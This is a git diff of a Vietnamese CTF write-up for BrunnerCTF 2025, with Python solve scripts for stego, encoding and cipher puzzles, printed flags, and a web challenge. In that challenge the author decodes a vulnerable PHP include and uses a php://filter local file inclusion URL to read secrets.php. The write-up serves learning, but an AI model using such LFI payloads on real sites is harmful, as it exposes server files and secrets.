@@ -9,9 +9,9 @@ tags: [writeup, steganography, crypto, osint, web-security, python, lfi, command
 ## Join the Discord!
 - **Độ khó:** Intro
 - **Tác giả:** BrunnerCTF
-- **Mô tả:**
+- **Mô tả:**  
 ![](/assets/img/BrunnerCTF2025/join-the-discord.png)
-- **Cách giải:**
+- **Cách giải:**  
 1. Nhấn vào link discord trên phần mô tả của challenge.
 2. Trong mô tả có đề cập phần announcements (thông báo), do đó nhấn vào announcements.
 3. Kiểm tra phần thông báo khai mạc cuộc thi thì thấy tin nhắn ẩn (hidden), click vào để hiện thì thu được flag.
@@ -21,9 +21,9 @@ tags: [writeup, steganography, crypto, osint, web-security, python, lfi, command
 ## TheBakingCase/Misc-Steganography
 - **Độ khó:** Beginner
 - **Tác giả:** H4N5
-- **Mô tả:**
+- **Mô tả:**  
 ![](/assets/img/BrunnerCTF2025/misc-steganography.png)
-- **Cách giải:**
+- **Cách giải:**  
 ```python    
 puzzle_text = """
 i UseD to coDE liKe A sLEEp-dEprIVed SqUirRel smasHInG keYs HOPinG BugS would dISApPear THrOugh fEAr tHeN i sPilled cOFfeE On mY LaPTop sCReameD iNTerNALly And bakeD BanaNa bREAd oUt oF PAnIc TuRNs OUT doUGh IS EasIEr tO dEbUG ThaN jaVASCrIPt Now I whIsPeR SWEEt NOtHIngs TO sOurDoUGh StARtERs aNd ThReATEN CrOissaNts IF they DoN'T rIsE My OVeN haS fEWeR CRasHEs tHAN mY oLD DEV sErvER aNd WHeN THInGS BurN i jUSt cAlL iT cARAMElIzEd FeatUReS no moRE meetInGS ThAt coUlD HAVE bEeN emailS JUst MufFInS THAt COulD HAvE BEen CupCAkes i OnCE tRIeD tO GiT PuSh MY cInnAmON rOLLs aND paNICkED WHEn I coUldn't reVErt ThEm NOw i liVe IN PeaCE uNLESs tHe yEast getS IDeas abOVe iTs StATion oR a COOkiE TrIES To sEgfAult my toOTH FILlings
@@ -45,17 +45,17 @@ for i in range(0, len(binary_string), 8):
         hidden_message += chr(decimal_value)
 
 print(f"The hidden message is: {hidden_message}")
-```
+```  
 
 - **Flag:** `brunner{I_like_Baking_More_That_Programming}`
 
 ## BasedBrunner/Misc
 - **Độ khó:** Beginner
 - **Tác giả:** Nissen
-- **Mô tả:**
+- **Mô tả:**  
 ![](/assets/img/BrunnerCTF2025/based-brunner.png)
 
-- **Cách giải:**
+- **Cách giải:**  
 ```python    
 def decode_step(text: str, base: int) -> str:
     encoded_parts = text.split(' ')  
@@ -71,16 +71,16 @@ for base in range(2, 11):
 
 print("Decoded Flag:")
 print(text)
-```
+```  
 
 - **Flag:** `brunner{1s_b4s3d}`
 
 ## Whisk/Crypto
 - **Độ khó:** Beginner
 - **Tác giả:** rvsms
-- **Mô tả:**
+- **Mô tả:**  
 ![](/assets/img/BrunnerCTF2025/whisk.png)
-- **Cách giải:**
+- **Cách giải:**  
 ```python    
 ciphertext = """
 DR🥐 C🥐TZ🥐D 🧁SXZ🥐A🧁🥐SD 🧁C 🍰KE🍰FC K🍩M🥐. D🍩 O🍰Q🥐 🍰 Y🥐ZP🥐TD
@@ -114,7 +114,7 @@ decrypted_message = decrypt(ciphertext, substitution_map)
 print("--- Decrypted Message ---")
 print(decrypted_message)
 print("\n" + "="*25 + "\n")
-```
+```  
 
 - **Flag:** `brunner{N0_M0R3_LUMPY_C1PH3R}`
 
@@ -124,9 +124,9 @@ print("\n" + "="*25 + "\n")
 ## The Yeast Key
 - **Độ khó:** Easy
 - **Tác giả:** H4N5
-- **Mô tả:**
+- **Mô tả:**  
 ![](/assets/img/BrunnerCTF2025/the-yeast-key.png)
-- **Cách giải:**
+- **Cách giải:**  
 ```python
 import base64
 
@@ -160,7 +160,7 @@ try:
     print(vault_key)
 except Exception as e:
     print(f"An error occurred during Base64 decoding: {e}")
-```
+```  
 - **Flag:** 
 `brunner{1i0n3l_p0i14n3_m4573r_0f_50urd0u6h_p455phr453_15_cr01554n7V4u17!93}`
 
@@ -168,9 +168,9 @@ except Exception as e:
 ## Pie Recipe
 - **Độ khó:** Easy
 - **Tác giả:** H4N5
-- **Mô tả:**
+- **Mô tả:**  
 ![](/assets/img/BrunnerCTF2025/pie-recipe.png)  
-- **Cách giải:**
+- **Cách giải:**  
 ```python
 import base64
 
@@ -198,7 +198,7 @@ if __name__ == "__main__":
     results = solve_phi_recipe(recipe_code)
 
     print(f"  The creator of the recipe is: {results['final_answer']}")
-```
+```  
 - **Flag:** `brunner{7h3_g01d3n_ph1_0f_zeckendorf}`
 
 ---
@@ -206,9 +206,9 @@ if __name__ == "__main__":
 ## Cake Vault
 - **Độ khó:** Medium
 - **Tác giả:** OddNorseman
-- **Mô tả:**
+- **Mô tả:**  
 ![](/assets/img/BrunnerCTF2025/cake-vault.png)
-- **Cách giải:**
+- **Cách giải:**  
 1. Tải file zip từ thử thách về, khá bất ngờ đó là một file map của game Minecraft
 2. Khá may mắn là có game Minecraft trong máy, sau đó copy file map được cho vào thư mục `/saves` từ thư mục của game.
 3. Tôi có thử tạm một phiên bản 1.21.4 để kiểm tra rằng map được tạo ra từ phiên bản nào thì phát hiện map được tạo ra ở phiên bản 1.21.8.
@@ -281,23 +281,22 @@ Kiểm tra trang web thông qua curl
 ```
 curl https://brunsviger-huset-9fca8e5675be40db.challs.brunnerne.xyz/
 ```
-![](/assets/img/BrunnerCTF2025/brunsviger-huset-1.png)
-Kiểm tra có thấy một đoạn code thêm vào một file `robots.txt`. Do đó thử thêm đoạn robots.txt trên URL của Challenge
+![](/assets/img/BrunnerCTF2025/brunsviger-huset-1.png)  
+Kiểm tra có thấy một đoạn code thêm vào một file `robots.txt`. Do đó thử thêm đoạn robots.txt trên URL của Challenge  
 ![](/assets/img/BrunnerCTF2025/brunsviger-huset-2.png)
-Từ đây tôi nghĩ rằng mình cần truy cập thử vào `print.php` hoặc là `secrets.php`
-Tôi có thử command injection để biết mã nguồn thì kết quả trả về như thế này
-![](/assets/img/BrunnerCTF2025/brunsviger-huset-3.png)
+Từ đây tôi nghĩ rằng mình cần truy cập thử vào `print.php` hoặc là `secrets.php`  
+Tôi có thử command injection để biết mã nguồn thì kết quả trả về như thế này  
+![](/assets/img/BrunnerCTF2025/brunsviger-huset-3.png)  
 ```
 PD9waHAKaWYgKGlzc2V0KCRfR0VUWydmaWxlJ10pKSB7CiAgICAkZmlsZSA9ICRfR0VUWydmaWxlJ107CgogICAgaWYgKHN0cnBvcygkZmlsZSwgJ3BocDovLycpID09PSAwIHx8IGZpbGVfZXhpc3RzKCRmaWxlKSkgewogICAgICAgIGluY2x1ZGUoJGZpbGUpOwogICAgfSBlbHNlIHsKICAgICAgICBlY2hvICJGaWxlIG5vdCBmb3VuZC4iOwogICAgfQp9IGVsc2UgewogICAgZWNobyAiTm8gZmlsZSBzcGVjaWZpZWQuIjsKfQo
 ```
-
-Tôi liền sử dụng **CyberChef** để biết được đoạn mã hoá base64 tôi đã kéo về từ mã nguồn của trang web
-![](/assets/img/BrunnerCTF2025/brunsviger-huset-4.png)
-Từ đây tôi thấy mình đã đúng hướng giải challenge này. Sau đó tôi tiếp tục dựa vào đoạn code base64 đã được giải mã để khai thác tiếp
+Tôi liền sử dụng **CyberChef** để biết được đoạn mã hoá base64 tôi đã kéo về từ mã nguồn của trang web  
+![](/assets/img/BrunnerCTF2025/brunsviger-huset-4.png)  
+Từ đây tôi thấy mình đã đúng hướng giải challenge này. Sau đó tôi tiếp tục dựa vào đoạn code base64 đã được giải mã để khai thác tiếp  
 ```
 https://brunsviger-huset-9fca8e5675be40db.challs.brunnerne.xyz/print.php?file=php://filter/convert.base64-encode/resource=secrets.php
 ```
-![](/assets/img/BrunnerCTF2025/brunsviger-huset-5.png)
+![](/assets/img/BrunnerCTF2025/brunsviger-huset-5.png)  
 
 - **Flag:** `brunner{l0c4l_f1l3_1nclus10n_1n_th3_b4k3ry}`
 
